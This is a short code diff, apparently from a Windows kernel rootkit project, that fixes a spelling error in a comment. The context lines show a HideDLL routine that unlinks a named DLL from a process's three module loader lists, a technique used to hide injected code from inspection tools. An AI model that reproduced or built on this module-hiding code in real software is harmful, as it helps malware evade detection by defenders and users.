@@ -228,7 +228,7 @@ int ProcessUtils::HideDLL(UINT32 PID, const WCHAR* DLLName) {
                 if (_wcsicmp(entryFileName, DLLName) == 0) {
                     DbgPrint("[+] Found matching DLL, unlinking from lists\n");
                     moduleBase = entry->DllBase;
-                    // If found, start unlinking from the doubly-lined list.
+                    // If found, start unlinking from the doubly-linked list.
                     FlinkBlinkHide(&entry->InLoadOrderLinks);
                     FlinkBlinkHide(&entry->InInitializationOrderLinks);
                     FlinkBlinkHide(&entry->InMemoryOrderLinks);
